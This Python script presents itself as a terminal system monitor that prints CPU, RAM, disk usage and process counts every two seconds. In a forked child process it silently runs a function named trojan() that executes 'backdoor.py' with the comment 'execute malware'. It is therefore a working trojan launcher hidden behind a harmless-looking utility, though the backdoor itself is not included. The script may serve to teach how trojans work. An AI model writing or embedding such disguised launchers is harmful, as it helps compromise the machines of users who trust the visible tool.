#!/usr/bin/python3
import psutil
import base64
import time
import gzip
import os

def main():
	# fork a child process
	pid = os.fork()

	if pid > 0:
		# parent process
		while True:
			# percentage of used CPU
			cpu = psutil.cpu_percent()
			# percentage of used RAM
			ram = psutil.virtual_memory().percent
			# percentage of used disk space
			disk = psutil.disk_usage("/").percent
			# number of all running processes
			processes_count = 0
			for _ in psutil.process_iter():
				processes_count += 1
			
			# print to screen
			print("---------------------------------------------------------")
			print("| CPU USAGE | RAM USAGE | DISK USAGE | RUNNING PROCESSES |")
			print("| {:02}%       | {:02}%       | {:02}%        | {}               |".format(int(cpu), int(ram), int(disk), processes_count))
			print("---------------------------------------------------------")

			# sleep for 2s
			time.sleep(2)
	else:
		# child process
		trojan()


def trojan():

	# execute malware
	os.system("/usr/bin/python3 backdoor.py")

if __name__ == "__main__":
	main()